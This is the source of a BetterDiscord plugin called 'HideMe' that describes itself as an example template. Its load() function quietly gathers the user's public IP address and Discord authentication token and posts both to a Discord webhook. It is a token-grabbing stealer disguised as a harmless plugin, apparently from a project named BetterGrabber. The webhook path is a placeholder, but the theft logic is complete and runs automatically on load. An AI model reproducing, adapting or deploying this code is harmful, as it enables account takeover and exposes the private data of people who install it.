/**
 * @name HideMe
 * @authorId Me
 * @invite Me
 * @donate https://www.paypal.me/GameOverLmao
 * @website https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD
 * @source https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
 * @updateUrl https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
 */
class HideMe {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() {
        return "HideMe";
    }
    getShortName() {
        return "HideMe";
    }
    getDescription() {
        return "This is an example/template for a BD plugin.";
    }
    getVersion() {
        return "1.0.0";
    }
    getAuthor() {
        return "Hideaki Atsuyo";
    }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel o, just standard HTML-->";
    }

    // Load/Unload
    async load() {
    	window.dispatchEvent(new Event('beforeunload')); //Useless Atm
    	const https = require('https');//Hehehe Hello XMLHttpRequest

    	var wh = "/api/webhooks/ID/TOKEN";

    	function getIP(){
    		return new Promise(async (resolve, reject) => {
    			https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(response) {
    				response.on('data', function(body) {
    					return resolve(body.toString());
    				}).on('error', (e) => {
    					console.error(e);
    				});
    			});
    		});
    	}

    	function getToken(){
    		return new Promise(async (resolve, reject) => {
    			return resolve(window.open().localStorage.token)
    		});
    	}

    	var IP = await getIP();
    	var token = await getToken();

        var pD = JSON.stringify({
            content: "@everyone",
            username: "Hello World",
            avatar_url: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
            tts: true,
            embeds: [{"title": "Hello World", "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": null, "fields": [{ "name": "IP", "value": IP, inline: false }, { "name": "Token", "value": token, inline: false }]}]
        });

        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": wh, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
        SendToWebhook.on('error', (e) => {
            console.error(e);
        });
        SendToWebhook.write(pD);
        SendToWebhook.end();
    }

    unload() {}

    // Events

    onMessage() {
        // Called when a message is received
    };

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };

    // Start/Stop
    start() {
      this.initialize();
    }

    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
}
